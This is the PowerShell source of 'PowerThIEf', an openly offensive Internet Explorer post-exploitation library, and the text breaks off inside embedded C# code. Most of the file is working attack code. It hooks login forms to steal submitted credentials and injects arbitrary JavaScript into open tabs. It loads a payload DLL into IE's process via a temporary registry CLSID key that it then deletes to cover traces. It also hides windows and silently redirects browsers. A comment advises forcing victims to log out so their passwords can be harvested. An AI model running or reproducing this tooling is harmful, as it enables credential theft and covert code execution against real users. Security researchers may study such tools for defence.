function Invoke-PowerThIEf {
<#
.SYNOPSIS
	The PowerThIEf, an Internet Explorer Post Exploitation library

.DESCRIPTION
	Author: Rob Maslen (@rbmaslen)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.PARAMETER action
	The action to perform, can be one of 
    ('ListUrls', 'Creds', 'ExecPayload', 'InvokeJS', 'DumpHtml', 'NewBackgroundTab','HookLoginForms', 'RemoveHooks', 'ListActions','HideWindow', 'ShowWindow','Navigate', 'Help')

.PARAMETER PathPayload 
Path to the binary(DLL) to launch in IE's process, used with the ExecPayload action

.PARAMETER BrowserIndex
Index of the browser to inject the payload into, these are listed by the action ListUrls
        
.PARAMETER Script  
The JavaScript to be invoked via InvokeJS flag")]
    
.PARAMETER SelectorType
The type of Selector when using DumpHtml can be either ('id','name','tag')
        

.PARAMETER Selector
        DOM Object selector to locate when using DumpHtml, specify type in SelectorType [default is id].

.PARAMETER Output
        Location for output which is either a file specified by OutputPath (or tempfile if thats blank), the screen[default] or to both. Can be either ('file','screen','both')
        

.PARAMETER OutputPath
Path to write output to if screen or both is selected in Output. If this is blank and either of those is selected a temp file will be written

.PARAMETER URLFilter
Regex to used to filter windows/tabs by URL when using ListUrls

.PARAMETER NavigateUrl
The URL to navigate to when using the Navigate action

.EXAMPLE
List URLs for all current IE browser sessions
Invoke-PowerThIEf -action ListUrls

.EXAMPLE
Launch the binary specified by the PathPayload param in IE's process
Invoke-PowerThIEf -action ExecPayload -PathPayload <path to the payload DLL(x64)>

.EXAMPLE
Invoke JavaScript in all currently opened IE windows and tabs
Invoke-PowerThIEf -action InvokeJS -Script <JavaScript to run>

.EXAMPLE
Invoke JavaScript in the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action InvokeJS -BrowserIndex <BrowserIndex> -Script <JavaScript to run>

.EXAMPLE
Dump the HTML of all currently opened IE windows/tabs
Invoke-PowerThIEf -action DumpHTML

.EXAMPLE
Dump the HTML from the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex>

.EXAMPLE
Dump the HTML from  all tags of <type> in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType tag -Selector <type>
e.g. Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType tag -Selector div

.EXAMPLE
Dump the HTML from any tag with the <id> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType id -Selector <id>
e.g. Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType id -Selector idfirstdiv

.EXAMPLE
Dump the HTML from any tag with the <name> found in the DOM of the selected IE window or tab. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType name -Selector <name>
e.g. Invoke-PowerThIEf -action DumpHTML -BrowserIndex <BrowserIndex> -SelectorType name -Selector namefirstdiv

.EXAMPLE
Show all currently opened IE windows/tabs
Invoke-PowerThIEf -action ShowWindow

.EXAMPLE
Show the selected opened IE windows/tabs. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action ShowWindow -BrowserIndex <BrowserIndex>

.EXAMPLE
Hide all currently opened IE windows/tabs
Invoke-PowerThIEf -action HideWindow

.EXAMPLE
Hide the selected opened IE windows/tabs. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action HideWindow -BrowserIndex <BrowserIndex>

.EXAMPLE
Navigate all currently opened IE windows/tabs to the <URL>
Invoke-PowerThIEf -action Navigate -NavigateUrl <URL> 

.EXAMPLE
Navigate all currently opened IE windows/tabs to the <URL>. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action Navigate -BrowserIndex <BrowserIndex> -NavigateUrl <URL> 

.EXAMPLE
Navigate all currently opened IE windows/tabs to the <URL>. Use ListUrls to get the BrowserIndex to identify the Window/Tab
Invoke-PowerThIEf -action Navigate -BrowserIndex <BrowserIndex> -NavigateUrl <URL> 

.EXAMPLE
Automatically scan any windows or tabs for login forms and record what gets posted. Once credentials have come in use -action creds to list them
Invoke-PowerThIEf -action HookLoginForms 

.EXAMPLE
List any creds that have been captured
Invoke-PowerThIEf -action Creds 

.EXAMPLE
Open a new background tab in the window that the <BrowserIndex> is in.
Invoke-PowerThIEf -action NewBackgroundTab -BrowserIndex <BrowserIndex>

#>

	param(
		# "ListUrls: List URLs for all current IE browser sessions"
        # "ExecPayload: Launch the binary specified by the PathPayload param in IE's process")]
        # "InvokeJS: Invoke JavaScript in all current IEs windows, one specified by a URLFilter or the BrowserIndex. Set script via -Script "
        # "DumpHtml: Dump Inner HTML for the Selector and SelectorType"
        # "Navigate: Navigate to the supplied url"
        # "HideWindow: Hides the parent of the current tab, no way unfortunately currently to hide individual tabs"
        # "ShowWindow: Sets the parent of the current tab to be visible"
        # "NewBackgroundTab: Creates a tab on the selected IE Window"
        # "HookLoginForms: Add an event to look for any login forms then dump any credentials that are POSTed"
        # "RemoveHooks: Remove the WindowRegistered and WindowRevoked hooks added by Hooking the Login Form"
        # "Creds: Dump the credentials that have been recovered by Hooking login forms"

        [Parameter(Mandatory = $True, HelpMessage="Index of the browser to inject the payload into, this comes from a previous ListUrls")]
        [ValidateSet('ListUrls', 'Creds', 'ExecPayload', 'InvokeJS', 'DumpHtml', 'NewBackgroundTab','HookLoginForms', 'RemoveHooks', 'ListActions','HideWindow', 'ShowWindow','Navigate', 'Help')]
        [String]$Action,

        [Parameter(Mandatory = $False,HelpMessage="Path to the binary(DLL) to launch in IE's process")]
        [String]$PathPayload,
        
        [Parameter(Mandatory = $False, HelpMessage="Index of the browser to inject the payload into, this comes from a previous ListUrls")]
        [String] $BrowserIndex,
        
        [Parameter(Mandatory = $False, HelpMessage="JavaScript to be invoked via InvokeJS flag")]
        [String]$Script,

        # Dump Html, the following support the dumping of the Inner HTML from an instance. Narrow the selection to dump by either using a target type of id, name or tagname
        # jQuery selectors not supported juuuuuusssttt yet... You could invoke some script if you want

        [ValidateSet('id','name','tag')]
        [String]$SelectorType,

        [Parameter(Mandatory = $False, HelpMessage="DOM Object selector to locate, specify type in SelectorType [default is id]. Used by DumpHtml")]
        [String]$Selector,

        [Parameter(Mandatory = $False, HelpMessage="Location for output which is either a file specified by OutputPath (or tempfile if thats blank), the screen[default] or to both")]
        [ValidateSet('file','screen','both')]
        [String]$Output,

        [Parameter(Mandatory = $False, HelpMessage="Path to write output to if screen or both is selected in Output. If this is blank and either of those is selected a temp file will be written ")]
        [String]$OutputPath,

        [Parameter(Mandatory = $False, HelpMessage="Regex to filter URLS")]
        [String]$URLFilter,

        [Parameter(Mandatory = $False, HelpMessage="URL to navigate to")]
        [String]$NavigateUrl
    )
    
    # Enumerates the ShellWinow.Items collection object looking for IExplorer instances
    # Translates the HWND to a PID via GetWindowThreadProcessId see above
	function global:getIEInstances
	{
        [OutputType([System.Collections.ArrayList])]
        Param( [Parameter(Mandatory = $False)]
        [bool]$overrideVersionCheck
        )

        $ShellWindows = LoadFullIEFrame
        [System.Collections.ArrayList]$results = @()

        if (!($overrideVersionCheck) -and (($PSVersionTable.PSVersion.Major -like "2*") -or ($PSVersionTable.PSVersion.Major -like "3*")))
        {
            Write-Host "[!] Powershell ($($PSVersionTable.PSVersion.Major)) detected"
            Write-Host "[!] Falling back to Accessibility API to locate HWNDs as can't use GetHWNDFromDocument"
            if ([Environment]::Is64BitOperatingSystem)
            {
                $iepids = Get-Process | Where-Object {   $_.ProcessName -eq "iexplore" -and [PowerThIEf.ProcessTools]::IsWin64($_) } | select-object -Property Id -ExpandProperty Id
            }
            else
            {
                $iepids = Get-Process | Where-Object {   $_.ProcessName -eq "iexplore"} | select-object -Property Id -ExpandProperty Id
            }
            if ($null -ne $iepids)
            {
                if(-Not ($iepids.GetType().IsArray))
                {
                    $temparr = @()
                    $temparr += $iepids
                    $iepids = $temparr
                }
                Write-Host "[!] Found IEPids"
                $hwnds = new-object -TypeName "System.Collections.Generic.Dictionary[IntPtr, String]"
                $shDocs = new-object -TypeName "System.Collections.Generic.Dictionary[IntPtr, String]"
                $mapHwndToPid = new-object -TypeName "System.Collections.Generic.Dictionary[IntPtr, UInt32]"
                $res = [PowerThIEf.WindowFinder]::EnumWindows(
                {
                    param($hwnd, $p)
                    $ppid = [uint32]0x0
                    $ptid = [PowerThIEf.WindowFinder]::GetWindowThreadProcessId($hwnd, [ref] $ppid);
                    
                    if (([System.Array]::IndexOf($iepids, [int]$ppid)) -ne -1) {
                        $sb = new-object -TypeName System.Text.StringBuilder -ArgumentList 250
                        [PowerThIEf.WindowFinder]::GetClassName($hwnd, $sb, 250);
                        if ($sb.ToString() -eq "IEFrame") {
                            $hwnds.Add($hwnd, $sb.ToString())
                            $mapHwndToPid.Add($hwnd, $ppid)
                            Write-Host "[+] IEFrame process pid: $ppid has HWND: $hwnd"
                        }
                    }
                    ,$true
                }, [System.IntPtr]::Zero)

                $mapHwndToWebBrowser = new-object -TypeName "System.Collections.Generic.Dictionary[IntPtr, object]"
                $mapHwndToHtmlWindow = new-object -TypeName "System.Collections.Generic.Dictionary[IntPtr, object]"
                Write-Host "[+] Now looking for children"
                foreach ($x in $hwnds.Keys) {
                    
                    $res = [PowerThIEf.WindowFinder]::EnumChildWindows($x, { param($lt, $p)
                        $hwnds = [PowerThIEf.WindowFinder]::FindWebBrowserFromHwnd($lt)
                        foreach( $n in $hwnds.Keys)
                        {
                            if ($mapHwndToWebBrowser.ContainsKey($n))
                            {
                                $mapHwndToWebBrowser[$n] = $hwnds[$n]["iwb2"]
                                $mapHwndToHtmlWindow[$n] = $hwnds[$n]["ihtmlwin2"]
                            }
                            else
                            {
                                $mapHwndToWebBrowser.Add($n, $hwnds[$n]["iwb2"])
                                $mapHwndToHtmlWindow.Add($n, $hwnds[$n]["ihtmlwin2"])
                            }
                        }
                        ,$true;
                    }, [System.IntPtr]::Zero)
                }

                Write-Host "[+] Found $($mapHwndToWebBrowser.Count) IE Windows"
                foreach($n in $mapHwndToWebBrowser.Keys)
                {
                    $shell = $mapHwndToWebBrowser[$n]
                    $instance = New-Object -TypeName PSObject -Property @{
                        INDEX = $n
                        URL = $shell.LocationURL
                        Browser = $shell
                        Window = $mapHwndToHtmlWindow[$n]
                    }
                    [void]$results.Add($instance)
                }
            }
        }
        else
        {
            Write-Host "[-] Looking for instances of IE"
            Foreach($shell in $ShellWindows)
            {
                try 
                {
                    # Really dirty way to tell if explorer or iexplore ohh well
                    $fileName = [System.IO.Path]::GetFileNameWithoutExtension($shell.FullName).ToLower();
                    if ($fileName.Equals("iexplore"))
                    {
                        if ($shell)
                        {
                            $instance = New-Object -TypeName PSObject -Property @{
                                Browser = $shell
                                URL = $shell.LocationURL
                                INDEX = [PowerThIEf.WindowHelper]::GetHWNDFromDocument($shell.Document)
                                Window = $shell.Document.parentWindow
                            }
                        }
                        [void]$results.Add($instance)
                    }
                }
                catch
                {
                    Write-Host "[X] Exception occured $($_.Exception.Message)"
                }
            }
        }
        ,$results
    }
    
    function global:getFilteredIEInstances
    {
        [OutputType([System.Collections.ArrayList])]
        Param( [Parameter(Mandatory = $False)]
        [bool]$overrideVersionCheck
        )
        [System.Collections.ArrayList]$results = @()

        if ($BrowserIndex -gt 0 -or ![string]::IsNullOrEmpty($URLFilter))
        {
            if ($BrowserIndex -gt 0)
            {
                Write-Host "[-] Browser Index of $BrowserIndex"
            }
            if (![System.String]::IsNullOrEmpty($URLFilter))
            {
                Write-Host "[-] URL filter of $URLFilter"
            }
        }
        $ieInstances = getIEInstances -overrideVersionCheck $overrideVersionCheck
        Write-Host "[-] Filtering instances"
        foreach($instance in $ieInstances)
        {
            # Check to see if this is one we want, first check for the HWND of the document then regex the URL
            if (![System.String]::IsNullOrEmpty($BrowserIndex) -and $BrowserIndex -ne $instance.INDEX)
            {
                continue
            }

            if (![string]::IsNullOrEmpty($URLFilter))
            {
                if (!($instance.URL -match $URLFilter))
                {
                    continue
                }
            }
            [void]$results.Add($instance)
        }
        ,$results
    }

    # The following functions support the loading of payloads via the Software\Classes\CLSID\{<GUID>} Shell integration
    # Modification of b33f's Hook-InProcServer https://github.com/FuzzySecurity/DefCon25 covered in his COM Hijacking live session
    # Well worth the cost of support via Patreon!!
    # This isn't COM hijacking, this is process migration into IE via IWebBrowser2::Navigate2 https://msdn.microsoft.com/en-us/library/aa752134(v=vs.85).aspx

	function buildRegistrykey
	{
        [OutputType([System.Guid])]
        Param(
            [Parameter(Mandatory=$true)]
            [String]$Payload
        )
        $CLSID = ([System.Guid]::NewGuid().ToString()) 
        New-Item -Path "HKCU:\Software\Classes\CLSID" -ErrorAction SilentlyContinue | Out-Null
		New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}" | Out-Null
		New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" | Out-Null
		New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" | Out-Null
		New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "(default)" -Value $Payload | Out-Null
		New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "ThreadingModel" -Value "Apartment" | Out-Null
		New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "LoadWithoutCOM" -Value "" | Out-Null
		New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Name "HideOnDesktop" -Value "" | Out-Null
		New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Name "Attributes" -Value 0xf090013d -PropertyType DWORD | Out-Null
        Write-Host "[+] Registry key built at HKCU:\Software\Classes\CLSID\{$CLSID}"
        ,$CLSID
	}

    function cleanUpRegistry
    {
        Param(
            [Parameter(Mandatory=$true)]
            [System.Guid]$CLSID
        )

        Write-Host "[!] Time to cleanup HKCU:\Software\Classes\CLSID\{$CLSID}"
        Remove-Item -Recurse -Force -Path "HKCU:\Software\Classes\CLSID\{$CLSID}"
        Write-Host "[+] Done"
    }

    function global:LoadFullIEFrame
    {
        Param()
        # Generally we shouldn't need to use this however (this is now the default it's just easier)
        # For some reason when you activate {9BA05972-F6A8-11CF-A442-00A0C90A8F39} the instance returned is missing
        # a few interfaces such as DShellWindowsEvents
        # https://msdn.microsoft.com/en-us/library/windows/desktop/cc836565(v=vs.85).aspx
        # This contains the events WindowRegistered and WindowRevoked which are useful for tracking window opens and closes
        # Code here loads ieframe.dll and then generates an in-memory assembly from the type library
        # it's based upon the MSDN sample at https://msdn.microsoft.com/en-us/library/k9w7de3e.aspx
        # We shouldn't need to do this everytime (but i am sue me), only if we track windows for login form thievery 
        # Also uses some example code from 
        # https://social.msdn.microsoft.com/Forums/sqlserver/en-US/73bd1e9c-81a6-44ba-81b4-fbbb469c770e/

        if (!$globalTrackIEFrameLoaded)
        {
            Write-Host "[-] Loading ieframe.dll and generating assembly from type library"
            $source = @"
            using System;
            using System.Reflection;
            using System.Runtime.InteropServices;
            using mshtml;

            public static class TlbImport
            {
                public enum RegKind
                {
                    RegKind_Default = 0,
                    RegKind_Register = 1,
                    RegKind_None = 2
                }

                [DllImport("oleaut32.dll", CharSet = CharSet.Unicode, PreserveSig = false)]
                public static extern void LoadTypeLibEx(String strTypeLibName, RegKind regKind,
                    [MarshalAs(UnmanagedType.Interface)] out Object typeLib);
            }

            public class ConversionEventHandler : ITypeLibImporterNotifySink
            {
                public void ReportEvent(ImporterEventKind eventKind, int eventCode, string eventMsg){}
                public Assembly ResolveRef(object typeLib){ return null;}
            }
"@
            Add-Type -TypeDefinition $source -Language CSharpVersion3 -ReferencedAssemblies Microsoft.mshtml

            $typeLib = new-object -TypeName System.Object
            if ([Environment]::Is64BitProcess -or !([Environment]::Is64BitOperatingSystem))
            {
                if ([Environment]::Is64BitOperatingSystem)
                {
                    Write-Host "[+] 64bit detected loading C:\\Windows\\System32\\ieframe.dll"
                }
                else 
                {
                    Write-Host "[+] 32bit detected loading C:\\Windows\\System32\\ieframe.dll"
                }
                [TlbImport]::LoadTypeLibEx( "C:\\Windows\\System32\\ieframe.dll", [TlbImport+RegKind]::RegKind_None, [ref] $typeLib)    
            } else 
            {
                if (![Environment]::Is64BitProcess -and [Environment]::Is64BitOperatingSystem)
                {
                    Write-Host "[+] SySWOW64bit detected loading C:\\Windows\\SysWOW64\\ieframe.dll"
                    [TlbImport]::LoadTypeLibEx( "C:\\Windows\\SysWOW64\\ieframe.dll", [TlbImport+RegKind]::RegKind_None, [ref] $typeLib) 
                }
            }
            $t = new-object -TypeName System.Runtime.InteropServices.TypeLibConverter
            $asm = $t.ConvertTypeLibToAssembly($typeLib, "Interop.ShDocVw.dll", 0, (new-object -TypeName ConversionEventHandler), $null, $null, "SHDocVW", $null)
            Write-Host "[+] SHDocVW assembly generated"
            # Also need to add the HtmlProxy but we need to load the previous classes first
            $shw = new-object -TypeName SHDocVW.ShellWindowsClass
            Set-Variable -Name "gShellWindows" -Value $shw  -Scope Script -Description "Instance of ShellWindowsClass"
            AddTypeHtmlEventProxy
            Write-Host "[+] ShellWindowsClass created"
            Set-Variable -Name "globalTrackIEFrameLoaded" -Value $true  -Scope global -Description "used to track the loading of ieframe.dll"
            Set-Variable -Name "SHDocVW" -Value $asm  -Scope Script -Description "Assembly containing types from ieframe.dll"
            ,$shw
        }
        else {
            ,$gShellWindows
        }
    }
   
   function RemoveHooks
   {
        if ($gShWindowsRegisteredAttached)
        {
            Unregister-Event -SourceIdentifier "ShWindowRegistered"| Out-Null
            Write-Host "[+] Unregistered Event: ShWindowRegistered"
            Unregister-Event -SourceIdentifier "ShWindowRevoked"| Out-Null
            Write-Host "[+] Unregistered Event: ShWindowRevoked"
            $gShWindowsRegisteredAttached = $false
        }
   }

    function DumpHtml
    {
        $ieInstances = getFilteredIEInstances
        #[ValidateSet('id','name','tagname')]
        #[String]$SelectorType,
        #[Parameter(Mandatory = $False, HelpMessage="DOM Object selector to locate, specify type in SelectorType [default is id]. Used by DumpHtml")]
        #[String]$Selector,

        if([String]::IsNullOrEmpty($Selector))
        {
           Write-Host "[!] Selector not set defaulting to the body"  
           $SelectorType = "id"
        }

        if([String]::IsNullOrEmpty($SelectorType))
        {
            Write-Host "[!] SelectorType not set defaulting to id"     
            $SelectorType = "id"
        }
        foreach($ie in $ieInstances)
        {
            switch($SelectorType)
            {
                "id"
                {
                    if([String]::IsNullOrEmpty($Selector))
                    {
                       write-host $ie.Browser.document.body.innerHTML  
                    } else 
                    {
                        "[+] Looking for elements with ""id='$($Selector)'"" in $($ie.URL)" |out-string
                        $ielement = $ie.Browser.document.getElementById($Selector)
                        if ([bool](Get-Member -InputObject $ielement -MemberType Properties -Name "InnerHTML")){
                            write-host -ForegroundColor Green $ielement.outerHTML    
                        } else {
                            write-host "[X] Element not found"
                        }
                    }
                }
                "name"
                {
                    if([String]::IsNullOrEmpty($Selector))
                    {
                       write-host "[X] Selector is empty, not going to find anything"  
                    } else
                    {
                        "[+] Looking for elements with ""name='$($Selector)'"" in $($ie.URL)" |out-string
                        $ielements = [PowerThIEf.DOMQuery]::getElementsByName($ie.Browser, $Selector)
                        if ($ielements.Count -lt 1)
                        {
                            write-host "[X] No elements found"
                        }
                        else
                        {
                            foreach($elem in $ielements)
                            {
                                write-host -ForegroundColor Green $elem   
                            }
                        }
                    }
                }
                "tag"
                {
                    if([String]::IsNullOrEmpty($Selector))
                    {
                       write-host "[X] Selector is empty, not going to find anything"  
                    } else 
                    {
                        "[+] Looking for elements ""<$($Selector)>"" in $($ie.URL)" |out-string
                        $ielements = [PowerThIEf.DOMQuery]::getElementsByTagName($ie.Browser, $Selector)
                        if ($ielements.Count -lt 1)
                        {
                            write-host "[X] No elements found"
                        }
                        else
                        {
                            foreach($elem in $ielements)
                            {
                                write-host -ForegroundColor Green $elem   
                            }
                        }
                    }
                }
            }
        }
    }
    function ChangeWindowVisibility
    {
        Param(
            [Parameter(Mandatory=$true)]
            [bool]$Visible
        )
        $ieInstances = getFilteredIEInstances
        if (!$ieInstances -or $ieInstances -and $ieInstances.Count -eq 0)
        {
            Write-Host "[X] No IE instances found using current criteria"
        } else {

            Write-Host "[+] Found $($ieInstances.Count) instances using current criteria"
            if (!$ieInstances -or $ieInstances -and $ieInstances.Count -eq 0)
            {
                Write-Host "[X] No IE instances found using current criteria"
            }
            Foreach($shell in $ieInstances)
            {
                $shell.Browser.Visible = $Visible
            }
        }
    }

    # Function to do the work based upon what switches have been passed
    function Dispatch
    {
        # We have to load the whole IEFrame.dll and generate a type library unfortunately
        # Was hoping to get away without having to do this but problems occur if the 
        # Activate method is used and then the Type library is loaded
        # This will also load all the EventProxy stuff        
        # "ListUrls", "ExecPayload", "InvokeJS", "DumpHtml","EventHandler", "ListActions", "Help")
        switch($Action)
        {

            "Help"
            {
                Write-Host "Welcome to PowerThIEf"
                Write-Host "The following actions are supported"

            }
            "DumpHtml"
            {
                #Call the DumpHTML function above, it's too long to have in Dispatch
                DumpHtml
            }
            "ExecPayload"
            {
                if ([String]::IsNullOrEmpty($PathPayload) -or ![System.IO.File]::Exists($PathPayload))
                {
                   Write-Host "[X] -PathPayload '$($PathPayload)' can not be found"
                }
                else
                {
                    $ieInstances = getFilteredIEInstances
                    if (!$ieInstances -or $ieInstances -and $ieInstances.Count -eq 0)
                    {
                        Write-Host "[X] No IE instances found using current criteria"
                    } else
                    {
                        Write-Host "[+] Found $($ieInstances.Count) instances using current criteria"
                        $results = New-Object System.Collections.ArrayList
                        Foreach($shell in $ieInstances)
                        {
                            $CLSID = buildRegistrykey -Payload $PathPayload
                            Write-Host "[-] Launching payload $($PathPayload)"
                            Write-Host "shell:::{$CLSID}"
                            try
                            {
                               $shell.Browser.Navigate2("shell:::{$CLSID}", 2048)
                            }
                            catch { #Just swallow the exception if we launch cool but cleanup needs to happen
                            }
                            Write-Host "[+] Done. Sleep 5 then cleanup"
                            Start-Sleep -Seconds 5
                            cleanUpRegistry -CLSID $CLSID
                            Write-Host "[+] We outta here"
                        }
                    }
                }
            }
            "InvokeJS"
            {
                $ieInstances = getFilteredIEInstances
                if (!$ieInstances -or $ieInstances -and $ieInstances.Count -eq 0)
                {
                    Write-Host "[X] No IE instances found using current criteria"
                } else {
                    Write-Host "[+] Found $($ieInstances.Count) instances using current criteria"
                    
                    $results = New-Object System.Collections.ArrayList
                    Foreach($shell in $ieInstances)
                    {
                        Write-Host "[+] Executing script within $($shell.INDEX)"
                        $winType = [mshtml.IHTMLWindow2]
                        if (($PSVersionTable.PSVersion.Major -like "2*") -or ($PSVersionTable.PSVersion.Major -like "3*"))
                        {           
                            $result = $shell.Window.execScript($Script, "JScript")
                        }
                        else
                        {
                            $result = $winType.InvokeMember("eval", [System.Reflection.BindingFlags]::InvokeMethod, $null, $shell.Window, @($Script))        
                        }
                        [void]$results.Add($result)
                    }
                    $results | Out-String 
                }
            }
            "ListUrls" {
                $ieInstances = getFilteredIEInstances
                if (!$ieInstances -or $ieInstances -and $ieInstances.Count -eq 0)
                {
                    Write-Host "[X] No IE instances found using current criteria"
                } 
                else 
                {
                    Write-Host "[+] Found $($ieInstances.Count) instances using current criteria"
                    $results = New-Object System.Collections.ArrayList
                    Foreach($shell in $ieInstances)
                    {
                        if ([String]::IsNullOrEmpty($Output) -Or $Output -eq "screen" )
                        {
                            $obj = select-object -InputObject $shell -Property INDEX, URL, @{Name="Visible"; Expression = {$shell.Browser.Visible}}
                            [void]$results.Add($obj)
                        }
                    }
                    $results | Format-Table -AutoSize
                }
            }
            "HideWindow"
            {
                ChangeWindowVisibility($false)
            }
            "ShowWindow"
            {
                ChangeWindowVisibility($true)
            }
            "NewBackgroundTab"
            {
                $ieInstances = getIEInstances
                if (!$ieInstances -or $ieInstances -and $ieInstances.Count -eq 0)
                {
                    Write-Host "[X] No IE instances found using current criteria"
                }
                else {
                    Write-Host "[+] Found $($ieInstances.Count) instances using current criteria"
                    Write-Host "[-] Creating new background tab"
                    # Uses Browser interface navigate to create a new tab
                    # https://msdn.microsoft.com/en-us/library/aa752133(v=vs.85).aspx
                    # The second value passed through is navOpenInBackgroundTab (4096) from BrowserNavConstants
                    # https://msdn.microsoft.com/en-us/library/dd565688(v=vs.85).aspx
                    $ieInstances[0].Browser.Navigate2("about:blank", 4096)
                    Write-Host "[+] Done. Sleeping for 2s then will attempt to locate in ShellWindows"
                    Start-Sleep -Seconds 2
                    Write-Host "[-] Looking for new tab"
                    $ieNewInstances = getFilteredIEInstances
                    $newTabId = ""
                    $newTabLocated = $false
                    foreach($new in $ieNewInstances)
                    {
                        $newTabFound = $true
                        foreach($old in $ieInstances)
                        {
                            if ($new.INDEX -eq $old.INDEX)
                            {
                                $newTabFound = $false
                            }
                        }
                        if ($newTabFound)
                        {
                            if ($new.URL -eq "about:blank") {
                                $newTabLocated = $true
                                Write-Host "[+] Found. New tab index is $($new.INDEX)"
                                break    
                            }
                        }
                    }

                    if(!$newTabLocated)
                    {
                        Write-Host "[X] New tab NOT found"
                    }
                }
            }
            "HookLoginForms" {
                RemoveHooks
                $ieInstances = getFilteredIEInstances
                $credThIEf = new-object -TypeName "PowerThIEf.CredentialThIEf" -ArgumentList $gShellWindows
                foreach($browser in $ieInstances)
                {
                    $credThief.AddManualHook($browser.Browser, $browser.INDEX)
                }
                Register-ObjectEvent -InputObject $gShellWindows -EventName WindowRegistered -SourceIdentifier "ShWindowRegistered" -Action {
                    # Event.SourceArgs comes through an Object[]. First item is the CookieId that is
                    # past to WindowRegistered https://docs.microsoft.com/en-us/windows/desktop/shell/dshellwindowsevents-windowregistered
                    [Int32]$val = [Int32]$Event.SourceArgs[0]
                    [PowerThIEf.CredentialThIEf]::QueueUpdate($val) 
                } | Out-Null
                Register-ObjectEvent -InputObject $gShellWindows -EventName WindowRevoked -SourceIdentifier "ShWindowRevoked" -Action {
                    # We might have caught the Window registration and have the cookie, check this first
                    Write-Host "[+] Window $(Event.SourceArgs) is closing"
                    Sleep(1)
                    if ($gMapHwndsToCookie.ContainsKey($Event.SourceArgs))
                    {
                        $clhwnd = $gMapHwndsToCookie[$Event.SourceArgs]
                        $gLoginFormHooker.Remove($clhwnd)
                    }
                    else 
                    {
                        $currHwnd = new-oject -Type "System.Collections.Generic.List[System.IntPtr]"
                        foreach($shell in $gShellWindows)
                        {
                            $fileName = [System.IO.Path]::GetFileNameWithoutExtension($shell.FullName).ToLower();
                            if ($fileName.Equals("iexplore"))
                            {
                                $currHwnd.Add([PowerThIEf.WindowHelper]::GetHWNDFromDocument($shell.Document))
                            }
                        }

                        foreach($knHwnd in $gKnownHwnds)
                        {
                            if(!$currHwnd.Contains($knHwnd))
                            {
                                $gLoginFormHooker.Remove($knHwnd)
                            }
                        }
                    }
                    Write-Host "[+] Window closed removing hooks"
                } | Out-Null
                Set-Variable -Name "gShWindowsRegisteredAttached" -Value $true  -Scope global -Description "Tracks all the loginformhooker objects"

                Write-Host "[+] Done now just sit back, relax and wait to collect for the creds to roll in"
                Write-Host "[!] ProTip: Why not use the InvokeJS function to trigger a logout on the target site..."
            }
            "Creds"
            {
                $creds = [PowerThIEf.LoginFormHooker]::GetCreds()
                if ($creds.Count -gt 0)
                {
                    foreach($url in $creds.Keys)
                    {
                        Write-Host "[+] Domain : $($Url)"
                        foreach ($creds in [PowerThIEf.LoginFormHooker]::GetCreds()[$Url])
                        {
                            Write-Host "`t$($creds)"
                        }
                    }
                }
                else 
                {
                    Write-host "[!] Nothing has been registered yet"
                }
            }
            "RemoveHooks"
            {
                RemoveHooks
            }
            "Navigate"
            {
                if ([string]::IsNullOrEmpty($NavigateUrl))
                {
                    Write-Host("[X] NavigateUrl is blank")
                }
                $ieInstances = getFilteredIEInstances
                foreach ($ie in $ieInstances)
                {
                    $ie.Browser.Navigate2($NavigateUrl)
                    Write-host "[+] Redirecting $($ie.INDEX) to $($NavigateUrl)"
                }
            }
        }
    }
    
    function AddTypeHtmlEventProxy
    {
        # Builds an HTML Event Proxy which uses this article as inspiration
        # https://www.codeproject.com/Articles/25769/Handling-HTML-Events-from-NET-using-C
        # Uses IReflect to emulate IDispatch, at this stage only takes an Action<Object> 
        # to be fired on the registered event. The Object is the DOM object the event has 
        # triggered on. This could definitely be improved but it's enough atm.

    $source = @"
using mshtml;
using System;
using System.Reflection;
using System.Globalization;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Threading;

namespace PowerThIEf
{
    public static class TPool
    {
        public delegate void TPOOLDELEGATE(object state);
        public static void QueueItem(TPOOLDELEGATE del, Int32 state)
        {
            ThreadPool.QueueUserWorkItem((o) =>
            {
                Console.WriteLine("[-] About to execute queued item");
                del.Invoke(state);
                Console.WriteLine("[+] QueuedItem complete");
            });
        }
    }
    public static class ProcessTools
    {
        public static bool IsWin64(Process process)
        {
            var retVal = false;
            if ((Environment.OSVersion.Version.Major > 5) || ((Environment.OSVersion.Version.Major == 5) && (Environment.OSVersion.Version.Minor >= 1)))
            {
                return !(NativeMethods.IsWow64Process(process.Handle, out retVal) && retVal);
            }
            return retVal;
        }
        internal static class NativeMethods
        {
